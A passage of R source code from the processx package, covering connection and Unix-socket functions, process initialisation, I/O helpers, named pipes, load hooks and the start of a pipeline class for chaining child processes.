#' `conn_read_chars()` and `conn_read_lines()` must not be used on the
#' same connection.
#'
#' @rdname processx_connections
#' @export

conn_read_bytes <- function(con, n = -1) UseMethod("conn_read_bytes", con)

#' @rdname processx_connections
#' @export

conn_read_bytes.processx_connection <- function(con, n = -1) {
  processx_conn_read_bytes(con, n)
}

#' @rdname processx_connections
#' @export

processx_conn_read_bytes <- function(con, n = -1) {
  assert_that(is_connection(con), is_integerish_scalar(n))
  chain_call(c_processx_connection_read_bytes, con, n)
}

#' @details
#' `conn_read_lines()` reads lines from a connection.
#'
#' @rdname processx_connections
#' @export

conn_read_lines <- function(con, n = -1) UseMethod("conn_read_lines", con)

#' @rdname processx_connections
#' @export

conn_read_lines.processx_connection <- function(con, n = -1) {
  processx_conn_read_lines(con, n)
}

#' @rdname processx_connections
#' @export

processx_conn_read_lines <- function(con, n = -1) {
  assert_that(is_connection(con), is_integerish_scalar(n))
  chain_call(c_processx_connection_read_lines, con, n)
}

#' @details
#' `conn_is_incomplete()` returns `FALSE` if the connection surely has no
#' more data.
#'
#' @rdname processx_connections
#' @export

conn_is_incomplete <- function(con) UseMethod("conn_is_incomplete", con)

#' @rdname processx_connections
#' @export

conn_is_incomplete.processx_connection <- function(con) {
  processx_conn_is_incomplete(con)
}

#' @rdname processx_connections
#' @export

processx_conn_is_incomplete <- function(con) {
  assert_that(is_connection(con))
  !chain_call(c_processx_connection_is_eof, con)
}

#' @details
#' `conn_write()` writes a character or raw vector to the connection.
#' It might not be able to write all bytes into the connection, in which
#' case it returns the leftover bytes in a raw vector. Call `conn_write()`
#' again with this raw vector.
#'
#' @param str Character or raw vector to write.
#' @param sep Separator to use if `str` is a character vector. Ignored if
#' `str` is a raw vector.
#'
#' @rdname processx_connections
#' @export

conn_write <- function(con, str, sep = "\n", encoding = "") {
  UseMethod("conn_write", con)
}

#' @rdname processx_connections
#' @export

conn_write.processx_connection <- function(
  con,
  str,
  sep = "\n",
  encoding = ""
) {
  processx_conn_write(con, str, sep, encoding)
}

#' @rdname processx_connections
#' @export

processx_conn_write <- function(con, str, sep = "\n", encoding = "") {
  assert_that(
    is_connection(con),
    (is.character(str) && all(!is.na(str))) || is.raw(str),
    is_string(sep),
    is_string(encoding)
  )

  if (is.character(str)) {
    pstr <- paste(str, collapse = sep)
    str <- iconv(pstr, "", encoding, toRaw = TRUE)[[1]]
  }
  invisible(chain_call(c_processx_connection_write_bytes, con, str))
}

#' @details
#' `conn_create_file()` creates a connection to a file.
#'
#' @param filename File name. For `conn_create_fifo()` on Windows, a
#' `\\?\pipe` prefix is added to this, if it does not have such a prefix.
#' For `conn_create_fifo()` it can also be `NULL`, in which case a random
#' file name is used via `tempfile()`.
#' @param read Whether the connection is readable.
#' @param write Whethe the connection is writeable.
#'
#' @rdname processx_connections
#' @export

conn_create_file <- function(filename, read = NULL, write = NULL) {
  if (is.null(read) && is.null(write)) {
    read <- TRUE
    write <- FALSE
  }
  if (is.null(read)) {
    read <- !write
  }
  if (is.null(write)) {
    write <- !read
  }

  assert_that(
    is_string(filename),
    is_flag(read),
    is_flag(write),
    read || write
  )

  chain_call(c_processx_connection_create_file, filename, read, write)
}

#' @details
#' `conn_set_stdout()` set the standard output of the R process, to the
#' specified connection.
#'
#' @param drop Whether to close the original stdout/stderr, or keep it
#' open and return a connection to it.
#'
#' @rdname processx_connections
#' @export

conn_set_stdout <- function(con, drop = TRUE) {
  assert_that(
    is_connection(con),
    is_flag(drop)
  )

  flush(stdout())
  invisible(chain_call(c_processx_connection_set_stdout, con, drop))
}

#' @details
#' `conn_set_stderr()` set the standard error of the R process, to the
#' specified connection.
#'
#' @rdname processx_connections
#' @export

conn_set_stderr <- function(con, drop = TRUE) {
  assert_that(
    is_connection(con),
    is_flag(drop)
  )

  flush(stderr())
  invisible(chain_call(c_processx_connection_set_stderr, con, drop))
}

#' @details
#' `conn_get_fileno()` return the integer file desciptor that belongs to
#' the connection.
#'
#' @rdname processx_connections
#' @export

conn_get_fileno <- function(con) {
  chain_call(c_processx_connection_get_fileno, con)
}

#' @details
#' `conn_disable_inheritance()` can be called to disable the inheritance
#' of all open handles. Call this function as soon as possible in a new
#' process to avoid inheriting the inherited handles even further.
#' The function is best effort to close the handles, it might still leave
#' some handles open. It should work for `stdin`, `stdout` and `stderr`,
#' at least.
#'
#' @rdname processx_connections
#' @export

conn_disable_inheritance <- function() {
  chain_call(c_processx_connection_disable_inheritance)
}

#' @rdname processx_connections
#' @export

close.processx_connection <- function(con, ...) {
  processx_conn_close(con, ...)
}

#' @param ... Extra arguments, for compatibility with the `close()`
#'    generic, currently ignored by processx.
#' @rdname processx_connections
#' @export

processx_conn_close <- function(con, ...) {
  chain_call(c_processx_connection_close, con)
}

#' @details
#' `is_valid_fd()` returns `TRUE` if `fd` is a valid open file
#' descriptor. You can use it to check if the R process has standard
#' input, output or error. E.g. R processes running in GUI (like RGui)
#' might not have any of the standard streams available.
#'
#' If a stream is redirected to the null device (e.g. in a callr
#' subprocess), that is is still a valid file descriptor.
#'
#' @rdname processx_connections
#' @export
#' @examples
#' is_valid_fd(0L)      # stdin
#' is_valid_fd(1L)      # stdout
#' is_valid_fd(2L)      # stderr

is_valid_fd <- function(fd) {
  assert_that(is_integerish_scalar(fd))
  fd <- as.integer(fd)
  chain_call(c_processx_is_valid_fd, fd)
}

#' Unix domain sockets
#'
#' @description
#' `r lifecycle::badge("experimental")`
#'
#' Cross platform point-to-point inter-process communication with
#' Unix=domain sockets, implemented via named pipes on Windows.
#' These connection are always bidirectional, i.e. you can read from them
#' and also write to them.
#'
#' @details
#' `conn_create_unix_socket()` creates a server socket. The new socket
#' is listening at `filename`. See `filename` above.
#'
#' `conn_connect_unix_socket()` creates a client socket and connects it to
#' a server socket.
#'
#' `conn_accept_unix_socket()` accepts a client connection at a server
#' socket.
#'
#' `conn_unix_socket_state()` returns the state of the socket. Currently it
#' can return: `"listening"`, `"connected_server"`, `"connected_client"`.
#' It is possible that other states (e.g. for a closed socket) will be added
#' in the future.
#'
#' ## Notes
#'
#' * [poll()] works on sockets, but only polls for data to read, and
#'   currently ignores the write-end of the socket.
#' * [poll()] also works for accepting client connections. It will return
#'   `"connect"`is a client connection is available for a server socket.
#'   After this you can call `conn_accept_unix_socket()` to accept the
#'   client connection.
#'
#' @param filename File name of the socket. On Windows it the name of the
#' pipe within the `\\?\pipe\` namespace, either the full name, or the
#' part after that prefix. If `NULL`, then a random name
#' is used, on Unix in the R temporary directory: [base::tempdir()].
#' @param encoding Encoding to assume when reading from the socket.
#' @param con Connection. An error is thrown if not a socket connection.
#' @return A new socket connection.
#'
#' @seealso [processx internals](https://processx.r-lib.org/dev/articles/internals.html)
#'
#' @rdname processx_sockets
#' @export

conn_create_unix_socket <- function(filename = NULL, encoding = "") {
  assert_that(
    is_string_or_null(filename),
    is_string(encoding)
  )

  filename <- make_pipe_file_name(filename)

  chain_call(
    c_processx_connection_create_socket,
    filename,
    encoding
  )
}

#' @rdname processx_sockets
#' @export

conn_connect_unix_socket <- function(filename, encoding = "") {
  assert_that(
    is_string_or_null(filename),
    is_string(encoding)
  )

  if (is_windows()) {
    if (!starts_with(filename, winpipeprefix)) {
      filename <- paste0(winpipeprefix, filename)
    }
  }

  chain_call(
    c_processx_connection_connect_socket,
    filename,
    encoding
  )
}

#' @rdname processx_sockets
#' @export

conn_accept_unix_socket <- function(con) {
  assert_that(is_connection(con))

  invisible(chain_call(
    c_processx_connection_accept_socket,
    con
  ))
}

#' @rdname processx_sockets
#' @export

conn_unix_socket_state <- function(con) {
  assert_that(is_connection(con))

  code <- chain_call(
    c_processx_connection_socket_state,
    con
  )

  c("listening", "listening", "connected_server", "connected_client")[code]
}
````

### `px390/processx/R/initialize.R`

````r
#' Start a process
#'
#' @param self this
#' @param private this$private
#' @param command Command to run, string scalar.
#' @param args Command arguments, character vector.
#' @param stdin Standard input, NULL to ignore.
#' @param stdout Standard output, NULL to ignore, TRUE for temp file.
#' @param stderr Standard error, NULL to ignore, TRUE for temp file.
#' @param pty Whether we create a PTY.
#' @param connections Connections to inherit in the child process.
#' @param poll_connection Whether to create a connection for polling.
#' @param env Environment vaiables.
#' @param cleanup Kill on GC?
#' @param cleanup_tree Kill process tree on GC?
#' @param wd working directory (or NULL)
#' @param echo_cmd Echo command before starting it?
#' @param supervise Should the process be supervised?
#' @param encoding Assumed stdout and stderr encoding.
#' @param post_process Post processing function.
#'
#' @keywords internal

process_initialize <- function(
  self,
  private,
  command,
  args,
  stdin,
  stdout,
  stderr,
  pty,
  pty_options,
  connections,
  poll_connection,
  env,
  cleanup,
  cleanup_tree,
  wd,
  echo_cmd,
  supervise,
  windows_verbatim_args,
  windows_hide_window,
  windows_detached_process,
  encoding,
  post_process,
  linux_pdeathsig
) {
  "!DEBUG process_initialize `command`"

  assert_that(
    is_string(command),
    is.character(args),
    is_std_conn(stdin),
    is_std_conn(stdout),
    is_std_conn(stderr),
    is_flag(pty),
    is.list(pty_options),
    is_named(pty_options),
    is_connection_list(connections),
    is.null(poll_connection) || is_flag(poll_connection),
    is.null(env) || is_env_vector(env),
    is_flag(cleanup),
    is_flag(cleanup_tree),
    is_string_or_null(wd),
    is_flag(echo_cmd),
    is_flag(windows_verbatim_args),
    is_flag(windows_hide_window),
    is_flag(windows_detached_process),
    is_string(encoding),
    is.function(post_process) || is.null(post_process),
    is_pdeathsig(linux_pdeathsig)
  )

  if (cleanup_tree && !cleanup) {
    warning(
      "`cleanup_tree` overrides `cleanup`, and process will be ",
      "killed on GC"
    )
    cleanup <- TRUE
  }

  if (pty && tolower(Sys.info()[["sysname"]]) == "sunos") {
    throw(new_error("`pty = TRUE` is not (yet) implemented on Solaris"))
  }
  if (pty && !is.null(stdin)) {
    throw(new_error("`stdin` must be `NULL` if `pty == TRUE`"))
  }
  if (pty && !is.null(stdout)) {
    throw(new_error("`stdout` must be `NULL` if `pty == TRUE`"))
  }
  if (pty && !is.null(stderr)) {
    throw(new_error("`stderr` must be `NULL` if `pty == TRUE`"))
  }

  def <- default_pty_options()
  pty_options <- utils::modifyList(def, pty_options)
  if (length(bad <- setdiff(names(def), names(pty_options)))) {
    throw(new_error(
      "Uknown pty option(s): ",
      paste(paste0("`", bad, "`"), collapse = ", ")
    ))
  }
  pty_options$rows <- as.integer(pty_options$rows)
  pty_options$cols <- as.integer(pty_options$cols)
  pty_options <- pty_options[names(def)]

  command <- enc2path(command)
  args <- enc2path(args)

  wd <- wd %||% getwd()
  if (!is.null(wd)) {
    # check is needed if the current working directory does not exist
    # `mustWork = FALSE` is needed if the supplied wd does not exist
    wd <- enc2path(normalizePath(wd, mustWork = FALSE))
  }

  private$command <- command
  private$args <- args
  private$cleanup <- cleanup
  private$cleanup_tree <- cleanup_tree
  private$wd <- wd
  private$pstdin <- stdin
  private$pstdout <- stdout
  private$pstderr <- stderr
  private$pty <- pty
  private$pty_options <- pty_options
  private$connections <- connections
  private$env <- env
  private$echo_cmd <- echo_cmd
  private$windows_verbatim_args <- windows_verbatim_args
  private$windows_hide_window <- windows_hide_window
  private$encoding <- encoding
  private$post_process <- post_process

  poll_connection <- poll_connection %||%
    (!identical(stdout, "|") && !identical(stderr, "|") && !length(connections))
  if (poll_connection) {
    pipe <- conn_create_pipepair()
    connections <- c(connections, list(pipe[[2]]))
    private$poll_pipe <- pipe[[1]]
  }

  if (echo_cmd) {
    do_echo_cmd(command, args)
  }

  if (!is.null(env)) {
    env <- process_env(env)
  }

  private$tree_id <- get_id()

  if (!is.null(wd)) {
    wd <- normalizePath(wd, winslash = "\\", mustWork = FALSE)
  }

  if (!isFALSE(linux_pdeathsig) && Sys.info()[["sysname"]] != "Linux") {
    warning("`linux_pdeathsig` is ignored on non-Linux systems")
  }
  if (isTRUE(linux_pdeathsig)) {
    linux_pdeathsig <- 15L # SIGTERM
  } else if (isFALSE(linux_pdeathsig)) {
    linux_pdeathsig <- 0L
  } else {
    linux_pdeathsig <- as.integer(linux_pdeathsig)
  }

  connections <- c(list(stdin, stdout, stderr), connections)

  "!DEBUG process_initialize exec()"
  ## Capture time just before the fork so we have a lower bound for the
  ## child's start time. /proc/<pid>/stat starttime has only 10ms resolution
  ## (100 Hz clock ticks), so it can appear to slightly predate this point.
  ## We take max(kernel_start_time, before_start) so the reported start time
  ## ($get_start_time()) is never earlier than when process$new() was called.
  ## private$starttime_raw holds the unmodified kernel time and is used for
  ## ps::ps_handle() validation (which has a 1-tick tolerance).
  before_start <- as.numeric(Sys.time())
  private$status <- chain_call(
    c_processx_exec,
    command,
    c(command, args),
    pty,
    pty_options,
    connections,
    env,
    windows_verbatim_args,
    windows_hide_window,
    windows_detached_process,
    private,
    cleanup,
    wd,
    encoding,
    paste0("PROCESSX_", private$tree_id, "=YES"),
    linux_pdeathsig
  )

  ## We try to query the start time according to the OS, because we can
  ## use the (pid, start time) pair as an id when performing operations on
  ## the process, e.g. sending signals. This is only implemented on Linux,
  ## macOS and Windows and on other OSes it returns 0.0, so we just use the
  ## current time instead. (In the C process handle, there will be 0,
  ## still.)
  private$starttime_raw <-
    chain_call(c_processx__proc_start_time, private$status)
  if (private$starttime_raw == 0) {
    private$starttime_raw <- as.numeric(Sys.time())
  }
  private$starttime <- max(private$starttime_raw, before_start)

  ## Need to close this, otherwise the child's end of the pipe
  ## will not be closed when the child exits, and then we cannot
  ## poll it.
  if (poll_connection) {
    close(pipe[[2]])
  }

  if (is.character(stdin) && stdin != "|" && stdin != "") {
    stdin <- full_path(stdin)
  }
  if (is.character(stdout) && stdout != "|" && stdout != "") {
    if (startsWith(stdout, ">>")) {
      stdout <- full_path(substring(stdout, 3))
    } else {
      stdout <- full_path(stdout)
    }
  }
  if (
    is.character(stderr) && stderr != "|" && stderr != "" && stderr != "2>&1"
  ) {
    if (startsWith(stderr, ">>")) {
      stderr <- full_path(substring(stderr, 3))
    } else {
      stderr <- full_path(stderr)
    }
  }

  ## Store the output and error files, we'll open them later if needed
  private$stdin <- stdin
  private$stdout <- stdout
  private$stderr <- stderr

  if (supervise) {
    supervisor_watch_pid(self$get_pid())
    private$supervised <- TRUE
  }

  invisible(self)
}
````

### `px390/processx/R/io.R`

````r
process_has_input_connection <- function(self, private) {
  "!DEBUG process_has_input_connection `private$get_short_name()`"
  !is.null(private$stdin_pipe)
}

process_has_output_connection <- function(self, private) {
  "!DEBUG process_has_output_connection `private$get_short_name()`"
  !is.null(private$stdout_pipe)
}

process_has_error_connection <- function(self, private) {
  "!DEBUG process_has_error_connection `private$get_short_name()`"
  !is.null(private$stderr_pipe)
}

process_has_poll_connection <- function(self, private) {
  "!DEBUG process_has_error_connection `private$get_short_name()`"
  !is.null(private$poll_pipe)
}

process_get_input_connection <- function(self, private) {
  "!DEBUG process_get_input_connection `private$get_short_name()`"
  if (!self$has_input_connection()) {
    throw(new_error("stdin is not a pipe."))
  }
  private$stdin_pipe
}

process_get_output_connection <- function(self, private) {
  "!DEBUG process_get_output_connection `private$get_short_name()`"
  if (!self$has_output_connection()) {
    throw(new_error("stdout is not a pipe."))
  }
  private$stdout_pipe
}

process_get_error_connection <- function(self, private) {
  "!DEBUG process_get_error_connection `private$get_short_name()`"
  if (!self$has_error_connection()) {
    throw(new_error("stderr is not a pipe."))
  }
  private$stderr_pipe
}

process_get_poll_connection <- function(self, private) {
  "!DEBUG process_get_poll_connection `private$get_short_name()`"
  if (!self$has_poll_connection()) {
    throw(new_error("No poll connection"))
  }
  private$poll_pipe
}

process_read_output <- function(self, private, n) {
  "!DEBUG process_read_output `private$get_short_name()`"
  con <- process_get_output_connection(self, private)
  if (private$encoding == "binary") {
    chain_call(c_processx_connection_read_bytes, con, n)
  } else {
    if (private$pty) {
      if (poll(list(con), 0)[[1]] == "timeout") return("")
    }
    chain_call(c_processx_connection_read_chars, con, n)
  }
}

process_read_error <- function(self, private, n) {
  "!DEBUG process_read_error `private$get_short_name()`"
  con <- process_get_error_connection(self, private)
  if (private$encoding == "binary") {
    chain_call(c_processx_connection_read_bytes, con, n)
  } else {
    chain_call(c_processx_connection_read_chars, con, n)
  }
}

process_read_output_bytes <- function(self, private, n) {
  "!DEBUG process_read_output_bytes `private$get_short_name()`"
  con <- process_get_output_connection(self, private)
  chain_call(c_processx_connection_read_bytes, con, n)
}

process_read_error_bytes <- function(self, private, n) {
  "!DEBUG process_read_error_bytes `private$get_short_name()`"
  con <- process_get_error_connection(self, private)
  chain_call(c_processx_connection_read_bytes, con, n)
}

process_read_output_lines <- function(self, private, n) {
  "!DEBUG process_read_output_lines `private$get_short_name()`"
  con <- process_get_output_connection(self, private)
  if (private$pty) {
    throw(new_error("Cannot read lines from a pty (see manual)"))
  }
  chain_call(c_processx_connection_read_lines, con, n)
}

process_read_error_lines <- function(self, private, n) {
  "!DEBUG process_read_error_lines `private$get_short_name()`"
  con <- process_get_error_connection(self, private)
  chain_call(c_processx_connection_read_lines, con, n)
}

process_is_incompelete_output <- function(self, private) {
  con <- process_get_output_connection(self, private)
  !chain_call(c_processx_connection_is_eof, con)
}

process_is_incompelete_error <- function(self, private) {
  con <- process_get_error_connection(self, private)
  !chain_call(c_processx_connection_is_eof, con)
}

process_read_all_output <- function(self, private) {
  result <- ""
  while (self$is_incomplete_output()) {
    self$poll_io(-1)
    # On Windows with pty=TRUE the IOCP loop forces timeout=0 once poll_pipe
    # signals EOF (process exit), so poll_io(-1) returns immediately after the
    # child exits regardless of the requested timeout.  conhost.exe processes
    # the child's final writes asynchronously; we must poll *only* the stdout
    # connection (not the full process) to give conhost time to flush, and then
    # call ClosePseudoConsole() explicitly so conhost closes its end of the pipe.
    if (private$pty && .Platform$OS.type == "windows" && !self$is_alive()) {
      con <- self$get_output_connection()
      repeat {
        p <- poll(list(con), 1000L)[[1]]
        if (!identical(p, "ready")) break
        result <- paste0(result, self$read_output())
      }
      chain_call(c_processx_pty_close, private$status,
                 private$get_short_name())
      while (self$is_incomplete_output()) {
        poll(list(con), -1L)
        result <- paste0(result, self$read_output())
      }
      return(result)
    }
    result <- paste0(result, self$read_output())
  }
  result
}

process_read_all_error <- function(self, private) {
  result <- ""
  while (self$is_incomplete_error()) {
    self$poll_io(-1)
    result <- paste0(result, self$read_error())
  }
  result
}

process_read_all_output_lines <- function(self, private) {
  results <- character()
  while (self$is_incomplete_output()) {
    self$poll_io(-1)
    results <- c(results, self$read_output_lines())
  }
  results
}

process_read_all_error_lines <- function(self, private) {
  results <- character()
  while (self$is_incomplete_error()) {
    self$poll_io(-1)
    results <- c(results, self$read_error_lines())
  }
  results
}

process_write_input <- function(self, private, str, sep) {
  "!DEBUG process_write_input `private$get_short_name()`"
  con <- process_get_input_connection(self, private)
  if (is.character(str)) {
    pstr <- paste(str, collapse = sep)
    str <- iconv(pstr, "", private$encoding, toRaw = TRUE)[[1]]
  }
  invisible(chain_call(c_processx_connection_write_bytes, con, str))
}

process_get_input_file <- function(self, private) {
  private$stdin
}

process_get_output_file <- function(self, private) {
  private$stdout
}

process_get_error_file <- function(self, private) {
  private$stderr
}

# Corresponds to processx.h, update there as well
poll_codes <- c(
  "nopipe", # PXNOPIPE
  "ready", # PXREADY
  "timeout", # PXTIMEOUT
  "closed", # PXCLOSED
  "silent", # PXSILENT
  "event", # PXEVENT
  "connect" # PXCONNECT
)

process_poll_io <- function(self, private, ms) {
  poll(list(self), ms)[[1]]
}
````

### `px390/processx/R/named_pipe.R`

````r
# These functions are an abstraction layer for named pipes. They're necessary
# because fifo() on Windows doesn't seem to work (as of R 3.3.3).

named_pipe_tempfile <- function(prefix = "pipe") {
  if (is_windows()) {
    # For some reason, calling tempfile("foo", tmpdir = "\\\\pipe\\.\\") takes
    # several seconds the first time it's called in an R session. So we'll do it
    # manually with paste0.
    paste0("\\\\.\\pipe", tempfile(prefix, ""))
  } else {
    tempfile(prefix)
  }
}


is_pipe_open <- function(pipe) {
  UseMethod("is_pipe_open")
}

#' @export
is_pipe_open.windows_named_pipe <- function(pipe) {
  chain_call(c_processx_is_named_pipe_open, pipe$handle)
}

#' @export
is_pipe_open.unix_named_pipe <- function(pipe) {
  # isOpen() gives an error when passed a closed fifo object, so this is a more
  # robust version.
  if (!inherits(pipe$handle, "fifo")) {
    throw(new_error("pipe$handle must be a fifo object"))
  }

  is_open <- NA
  tryCatch(
    is_open <- isOpen(pipe$handle),
    error = function(e) {
      is_open <<- FALSE
    }
  )

  is_open
}


create_named_pipe <- function(name) {
  if (is_windows()) {
    structure(
      list(
        handle = chain_call(c_processx_create_named_pipe, name, "")
      ),
      class = c("windows_named_pipe", "named_pipe")
    )
  } else {
    structure(
      list(
        handle = fifo(name, "w+")
      ),
      class = c("unix_named_pipe", "named_pipe")
    )
  }
}


close_named_pipe <- function(pipe) {
  UseMethod("close_named_pipe")
}

#' @export
close_named_pipe.windows_named_pipe <- function(pipe) {
  chain_call(c_processx_close_named_pipe, pipe$handle)
}

#' @export
close_named_pipe.unix_named_pipe <- function(pipe) {
  close(pipe$handle)
}

write_lines_named_pipe <- function(pipe, text) {
  UseMethod("write_lines_named_pipe")
}

#' @export
write_lines_named_pipe.windows_named_pipe <- function(pipe, text) {
  text <- paste(text, collapse = "\n")

  # Make sure it ends with \n
  len <- nchar(text)
  if (substr(text, len, len) != "\n") {
    text <- paste0(text, "\n")
  }

  chain_call(c_processx_write_named_pipe, pipe$handle, text)
}

#' @export
write_lines_named_pipe.unix_named_pipe <- function(pipe, text) {
  writeLines(text, pipe$handle)
}
````

### `px390/processx/R/on-load.R`

````r
## nocov start

.onLoad <- function(libname, pkgname) {
  ## This is needed to fix the boot time to a given value,
  ## because in a Docker container (maybe elsewhere as well?) on
  ## Linux it can change (!).
  ## See https://github.com/r-lib/processx/issues/258
  ## We don't do it on macOS, because it breaks codex
  ## https://github.com/r-lib/processx/pull/401
  if (is_linux() && ps::ps_is_supported()) {
    ps::ps_handle()
    if (utils::packageVersion("ps") >= "1.9.2.9001") {
      ## Pass NULL to enable CLOCK_REALTIME-CLOCK_MONOTONIC precise boot time,
      ## which requires ps >= 1.9.2.9001 for compatible handle validation.
      .Call(c_processx__set_boot_time, NULL)
    } else {
      bt <- ps::ps_boot_time()
      .Call(c_processx__set_boot_time, bt)
    }
  }

  supervisor_reset()
  if (
    Sys.getenv("DEBUGME", "") != "" &&
      requireNamespace("debugme", quietly = TRUE)
  ) {
    debugme::debugme()
  }

  err$onload_hook()
}

.onUnload <- function(libpath) {
  chain_call(c_processx__unload_cleanup)
  supervisor_reset()
}

## nocov end
````

### `px390/processx/R/pipeline.R`

````r
#' Pipeline of processes connected with pipes
#'
#' @description
#' `r lifecycle::badge("experimental")`
#'
#' A `pipeline` object represents a sequence of processes whose standard
#' input and output streams are connected with pipes, like a Unix pipeline
#' (`cmd1 | cmd2 | cmd3`). Data flows directly between the child processes
#' via kernel-level pipes — the parent R process sees only the output of the
#' final command (when `stdout = "|"`).
#'
#' @param cmds A non-empty list of character vectors. Each vector is one
#'   command: the first element is the executable and the rest are its
#'   arguments. Example: `list(c("sort"), c("uniq", "-c"))`.
#' @param stdin Standard input for the *first* process. `NULL` to discard,
#'   `"|"` so the parent R process can write to it via `$write_input()`, or
#'   a file path.
#' @param stdout Standard output of the *last* process. `"|"` (the default)
#'   so the parent R process can read from it, `NULL` to discard, or a file
#'   path.
#' @param stderr Standard error for *all* processes. `NULL` (the default) to
#'   discard, `"|"` to create a separate readable pipe per process, `"2>&1"`
#'   to merge into stdout, or a file path. When `"|"`, use
#'   `$read_error()` to read from the last process; use `$get_processes()`
#'   to access individual process objects for other processes.
#' @param env Environment variables for all processes, or `NULL` to inherit
#'   the parent environment.
#' @param encoding Assumed encoding for stdin/stdout/stderr streams.
#' @param wd Working directory for all processes, or `NULL` for the current
#'   directory.
#' @param cleanup Whether to kill the processes on garbage collection.
#' @param cleanup_tree Whether to kill the full process trees on garbage
#'   collection.
#' @param n Number of characters or lines to read. -1 means all available.
#' @param str String to write to the process stdin.
#' @param sep Separator to add after `str`.
#' @param timeout Timeout in milliseconds. -1 means no timeout.
#' @param grace Grace period in seconds before sending SIGKILL (Unix) or
#'   terminating forcefully (Windows). Currently not used.
#' @param close_connections Whether to close connections after killing.
#' @param ... Not used, for compatibility with the generic.
#'
#' @section Methods:
#' `pipeline$new(cmds, stdin, stdout, stderr, env, encoding, wd,
#'   cleanup, cleanup_tree)`
#'
#' `$read_output(n = -1)`, `$read_output_lines(n = -1)`,
#' `$read_all_output()`, `$read_all_output_lines()` — read from the last
#' process (only meaningful when `stdout = "|"`).
#'
#' `$poll_io(timeout)` — poll the last process's connections for I/O.
#'
#' `$read_error(n = -1)`, `$read_error_lines(n = -1)`,
#' `$read_all_error()`, `$read_all_error_lines()` — read stderr of the
#' last process (only meaningful when `stderr = "|"`).
#'
#' `$write_input(str, sep = "\n")` — write to first process stdin
#' (only meaningful when `stdin = "|"`).
#'
#' `$close_input()` — close the first process stdin, signalling EOF.
#'
#' `$wait(timeout = -1)` — wait for all processes to finish.
#'
#' `$kill(grace = 0.1, close_connections = TRUE)` — kill all processes.
#'
#' `$kill_tree(grace = 0.1, close_connections = TRUE)` — kill all
#' process trees.
#'
#' `$is_alive()` — returns `TRUE` if any process is still running.
#'
#' `$get_exit_statuses()` — list of exit codes (one per process; `NULL`
#' if still running).
#'
#' `$get_pids()` — integer vector of process IDs.
#'
#' `$get_processes()` — list of [process] objects, one per command.
#'
#' `$format()` — string representation of the pipeline.
#'
#' `$print()` — print the pipeline to the screen.
#'
#' @examples
#' \dontrun{
#' # sort | uniq, reading from / writing to R
#' pl <- pipeline$new(
#'   list(c("sort"), c("uniq")),
#'   stdin = "|", stdout = "|"
#' )
#' pl$write_input("b\na\nb\na\n")
#' pl$close_input()
#' pl$read_all_output_lines()
#' pl$wait()
#' pl$get_exit_statuses()
#' }
#'
#' @export
pipeline <- R6::R6Class(
  "pipeline",
  cloneable = FALSE,

  public = list(

    #' @description Create a new pipeline.
    initialize = function(
      cmds,
      stdin = NULL,
      stdout = "|",
      stderr = NULL,
      env = NULL,
      encoding = "utf-8",
      wd = NULL,
      cleanup = TRUE,
      cleanup_tree = FALSE
    ) {
      if (!is.list(cmds) || length(cmds) == 0L) {
        throw(new_error("`cmds` must be a non-empty list of character vectors"))
      }
      for (i in seq_along(cmds)) {
        if (!is.character(cmds[[i]]) || length(cmds[[i]]) == 0L) {
          throw(new_error(paste0(
            "`cmds[[", i, "]]` must be a non-empty character vector"
          )))
        }
      }

      n <- length(cmds)

      ## Spawn all processes, creating one inter-process pipe per iteration
      ## so that later children cannot inherit handles from pipes that do not
      ## concern them.  On Windows, CreateProcess with bInheritHandles=TRUE
      ## passes every inheritable handle to the child.  Creating each pipe
      ## just before the two processes that need it are spawned — and closing
      ## both ends in the parent immediately after — ensures no child ever
      ## holds a stray write-end that would prevent EOF from propagating.
      ## On Unix, O_CLOEXEC already prevents inheritance, but the same
      ## iterative pattern keeps the logic consistent.
      procs     <- vector("list", n)
      prev_read <- NULL   ## read end of the previous inter-process pipe

      for (i in seq_len(n)) {
        cmd <- cmds[[i]]

        ## Create the pipe connecting process i's stdout to process i+1's
        ## stdin, unless this is the last process.
        if (i < n) {
          next_pipe   <- conn_create_proc_pipepair()
          proc_stdout <- next_pipe[[1L]]   ## write end → child's stdout
        } else {
          next_pipe   <- NULL
          proc_stdout <- stdout
        }

        proc_stdin <- if (i == 1L) stdin else prev_read
        ## Disable poll_connection for intermediate processes: their stdout is
        ## a connection (not "|"), so the default formula would create an
        ## unnecessary extra pipe.
        proc_poll  <- if (i < n) FALSE else NULL

        procs[[i]] <- process$new(
          cmd[[1L]],
          cmd[-1L],
          stdin            = proc_stdin,
          stdout           = proc_stdout,
          stderr           = stderr,
          env              = env,
          encoding         = encoding,
          wd               = wd,
          cleanup          = cleanup,
          cleanup_tree     = cleanup_tree,
          poll_connection  = proc_poll
        )

        ## Close parent's copies immediately: the child now owns these
        ## handles, and closing here prevents the next child from inheriting
        ## the write-end of a pipe it should only read from.
        if (!is.null(next_pipe)) close(next_pipe[[1L]])  ## write end → stdout of process i
        if (!is.null(prev_read)) close(prev_read)         ## read end  → stdin  of process i

        prev_read <- if (!is.null(next_pipe)) next_pipe[[2L]] else NULL
      }

      private$procs <- procs
      invisible(self)
    },

    ## ------------------------------------------------------------------ ##
    ##  Output (last process)                                               ##
    ## ------------------------------------------------------------------ ##

    #' @description Read output of the last process.
    read_output = function(n = -1) {
      private$last()$read_output(n)
    },

    #' @description Read output lines of the last process.
    read_output_lines = function(n = -1) {
      private$last()$read_output_lines(n)
    },

    #' @description Read all output of the last process.
    read_all_output = function() {
      private$last()$read_all_output()
    },

    #' @description Read all output lines of the last process.
    read_all_output_lines = function() {
      private$last()$read_all_output_lines()
    },

    #' @description Poll the connections of the last process for I/O.
    poll_io = function(timeout) {
      private$last()$poll_io(timeout)
    },

    ## ------------------------------------------------------------------ ##
    ##  Error (last process)                                                ##
    ## ------------------------------------------------------------------ ##

    #' @description Read stderr of the last process.
    read_error = function(n = -1) {
      private$last()$read_error(n)
    },

    #' @description Read stderr lines of the last process.
    read_error_lines = function(n = -1) {
      private$last()$read_error_lines(n)
    },

    #' @description Read all stderr of the last process.
    read_all_error = function() {
      private$last()$read_all_error()
    },

    #' @description Read all stderr lines of the last process.
    read_all_error_lines = function() {
      private$last()$read_all_error_lines()
    },

    ## ------------------------------------------------------------------ ##
    ##  Input (first process)                                               ##
    ## ------------------------------------------------------------------ ##

    #' @description Write to the first process stdin.
    write_input = function(str, sep = "\n") {
      private$procs[[1L]]$write_input(str, sep)
    },

    #' @description Close the first process stdin (signals EOF to the process).
    close_input = function() {
      close(private$procs[[1L]]$get_input_connection())
    },

    ## ------------------------------------------------------------------ ##
    ##  Lifecycle                                                           ##
    ## ------------------------------------------------------------------ ##
